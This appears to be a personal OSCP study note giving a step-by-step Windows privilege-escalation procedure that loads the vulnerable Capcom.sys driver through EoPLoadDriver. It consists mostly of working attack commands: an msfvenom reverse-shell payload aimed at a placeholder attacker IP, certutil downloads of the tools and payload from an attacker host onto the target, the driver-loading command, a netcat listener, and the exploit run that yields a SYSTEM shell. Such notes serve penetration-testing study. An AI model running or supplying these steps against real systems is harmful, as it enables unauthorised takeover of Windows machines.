#### Conditions

version < Windows 10 20H2 (Build 19042)
checking if Windows Defender is active

```powershell
# Disabled:1
get-item 'hklm:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\'
```

#### Steps

create reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f exe -o rev.exe
```

download Capcom.sys

```
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
```

download eoploaddriver.cpp and compile

```
https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp
```

create a new project (Visual Studio 2022 Community Edition)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_1.png)
![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_2.png)

change project name ```eoploaddriver```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_3.png)

copy and paste the contents of the ```eoploaddriver.cpp``` file and comment out line 6 ```#include "stdafx.h"```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_4.png)

configure project to target platforms

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_5.png)

build project

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_6.png)

executable file default location

```
C:\Users\<user>\source\repos\eoploaddriver\x64\Release
```

download ExploitCapcom project and compile

```
https://github.com/tandasat/ExploitCapcom
```

Execute original file will pop up an additional window. The code must be modified to run the reverse shell payload.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_7.png)


upload the files we need on the target

```
certutil -urlcache -split -f "http://<attcker ip>/Capcom.sys" "C:\Windows\Temp\Capcom.sys"
certutil -urlcache -split -f "http://<attcker ip>/eoploaddriver.exe" "C:\Windows\Temp\eoploaddriver.exe"
certutil -urlcache -split -f "http://<attcker ip>/ExploitCapcom.exe" "C:\Windows\Temp\ExploitCapcom.exe"
certutil -urlcache -split -f "http://<attcker ip>/rev.exe" "C:\Windows\Temp\rev.exe"
```

execute the ```eoploaddriver.exe``` on the target (Note that Capcom.sys must specify the full path)

```
C:\Windows\Temp\eoploaddriver.exe System\CurrentControlSet\dfserv C:\Windows\Temp\Capcom.sys
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_8.png)

start listening

```
sudo nc -nlvp 80
```

execute the ```ExploitCapcom.exe``` 

```
C:\Windows\Temp\ExploitCapcom.exe
```

![iamge](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_9.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/Windows/Privilege/EoPLoadDriver_20220724_10.png)